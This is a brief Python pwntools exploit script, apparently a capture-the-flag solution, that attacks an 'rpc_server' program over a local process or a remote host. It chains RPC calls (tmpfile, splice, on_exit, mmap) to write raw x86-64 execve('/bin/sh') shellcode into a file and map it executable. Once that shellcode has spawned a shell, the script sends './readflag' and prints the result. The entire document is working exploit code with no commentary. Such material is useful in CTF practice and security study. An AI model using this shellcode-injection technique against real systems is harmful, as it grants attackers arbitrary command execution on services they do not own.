#!/usr/bin/env python3
from pwn import *
import time

if args.HOST:
    p = remote(args.HOST, int(args.PORT))
else:
    p = process(['./rpc_server'])

p.recvuntil(b'[debug] RPC ready\n')

p.send(b':tmpfile 0 0 0 0 0 0\n')
p.recvuntil(b'[debug] finished rpc_.so:tmpfile(0, 0, 0, 0, 0, 0) RPC\n')

p.send(b':splice 0 0 3 0 28 0\n')
#p.recvuntil(b"RPC\n")
time.sleep(0.1)
p.send(b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')
p.recvuntil(b"RPC\n")

p.send(b':on_exit 1048576 0 0 0 0 0\n')
p.recvuntil(b"RPC\n")

p.send(b':mmap 1048576 4 7 2 3 0\n')
p.recvuntil(b"RPC\n")

p.recvuntil(b'security error!\n')

p.sendline(b"./readflag")
print(p.recv())
